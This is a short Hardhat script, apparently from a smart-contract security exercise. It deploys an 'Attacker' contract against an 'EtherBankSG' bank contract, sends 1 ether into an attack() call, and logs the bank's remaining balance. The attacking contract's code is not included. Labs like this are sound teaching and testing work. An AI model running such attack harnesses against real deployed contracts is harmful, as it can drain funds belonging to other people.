import { getContractAddress } from "ethers/lib/utils";
import { ethers } from "hardhat";
import addressBook from "./addressBook.json";

async function main() {
  //*deploy Attacker contract

  const Attacker = await ethers.getContractFactory("Attacker");
  const attacker = await Attacker.deploy(addressBook.EtherBankSG);

  //* attack EtherBank contract
  await attacker.attack({ value: ethers.utils.parseEther("1") });

  //* Bank's balance
  const bank = await ethers.getContractAt(
    "EtherBankSG",
    addressBook.EtherBankSG
  );
  const balance = (await bank.getBalance()).toString();
  console.log("EtherBankSG's balance:", balance);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
